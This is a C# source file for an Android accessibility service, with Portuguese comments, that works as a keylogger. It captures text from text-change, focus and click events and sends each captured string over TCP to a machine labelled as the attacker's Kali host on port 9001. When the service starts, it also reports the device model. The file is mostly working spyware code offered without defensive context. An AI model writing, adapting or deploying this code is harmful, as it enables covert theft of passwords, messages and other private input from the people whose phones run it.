using Android.AccessibilityServices;
using Android.App;
using Android.Views.Accessibility;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Android.OS;
using System.Linq;

namespace teste.Platforms.Android
{
    [Service(Name = "com.companyname.teste.MyAccessibilityService",
             Permission = "android.permission.BIND_ACCESSIBILITY_SERVICE",
             Exported = false)]
    [IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
    public class MyAccessibilityService : AccessibilityService
    {
        private const string KALI_IP = "0.0.0.0"; // Seu IP
        private const int KALI_PORT = 9001; // Porta

        public override void OnAccessibilityEvent(AccessibilityEvent? e)
        {
            if (e == null) return;
            string? capturedText = e.Text?.FirstOrDefault()?.ToString();
            if (!string.IsNullOrEmpty(capturedText))
            {
                switch (e.EventType)
                {
                    case EventTypes.ViewTextChanged:
                    case EventTypes.ViewFocused:
                    case EventTypes.ViewClicked:
                        System.Diagnostics.Debug.WriteLine($"[Keylogger] Texto Capturado: {capturedText} (Evento: {e.EventType})");
                        SendDataToKali(capturedText);
                        break;
                }
            }
        }

        protected override void OnServiceConnected()
        {
            base.OnServiceConnected();
            System.Diagnostics.Debug.WriteLine("[ALERTA] Serviço de acessibilidade conectado. Enviando sinal para o Kali...");

            string deviceInfo = $"Dispositivo: {Build.Model} (API: {Build.VERSION.SdkInt})";
            SendDataToKali($"[ALERTA] Serviço ativado com sucesso! {deviceInfo}");
        }

        private void SendDataToKali(string data)
        {
            Task.Run(() =>
            {
                try
                {
                    using (var client = new TcpClient())
                    {
                        if (client.ConnectAsync(KALI_IP, KALI_PORT).Wait(3000))
                        {
                            byte[] buffer = Encoding.UTF8.GetBytes(data + "\n");
                            NetworkStream stream = client.GetStream();
                            stream.Write(buffer, 0, buffer.Length);
                        }
                        else
                        {
                            System.Diagnostics.Debug.WriteLine($"[REDE] Falha ao conectar ao Kali: Timeout.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"[REDE] Erro ao enviar dados: {ex.Message}");
                }
            });
        }

        public override void OnInterrupt()
        {
            System.Diagnostics.Debug.WriteLine("Serviço de acessibilidade interrompido.");
        }
    }
}

